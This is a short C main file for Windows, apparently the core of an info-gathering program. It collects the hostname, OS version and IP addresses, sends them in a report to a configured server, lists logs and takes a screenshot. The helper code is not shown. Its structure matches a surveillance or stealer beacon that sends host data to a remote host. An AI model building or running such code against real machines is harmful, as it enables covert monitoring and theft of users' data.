#include <stdio.h>
#include <winsock2.h>
#include "config.h"
#include "core/system_info.h"
#include "core/screenshot.h"
#include "core/logs.h"
#include "network/ip.h"
#include "network/communication.h"

int main(void) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    char hostname[BUFFER_SIZE];
    char os_info[BUFFER_SIZE];
    char private_ip[BUFFER_SIZE];
    char public_ip[BUFFER_SIZE];
    char logs[DATA_BUFFER];

    get_hostname(hostname, sizeof(hostname));
    get_os_version(os_info, sizeof(os_info));
    get_private_ip(private_ip, sizeof(private_ip));
    get_public_ip(public_ip, sizeof(public_ip));

    printf("[*] Hostname   : %s\n", hostname);
    printf("[*] OS         : %s\n", os_info);
    printf("[*] Private IP : %s\n", private_ip);
    printf("[*] Public IP  : %s\n", public_ip);

    MachineReport report = {
        .hostname   = hostname,
        .os_info    = os_info,
        .private_ip = private_ip,
        .public_ip  = public_ip,
    };

    printf("[*] Sending report to %s...\n", SERVER_URL);
    send_report(SERVER_URL, &report);

    list_logs(LOGS_DIR, logs, sizeof(logs));
    printf("[*] Logs:\n%s\n", logs);

    capture_screenshot(SCREENSHOT);
    printf("[*] Screenshot saved to %s\n", SCREENSHOT);

    WSACleanup();
    return 0;
}
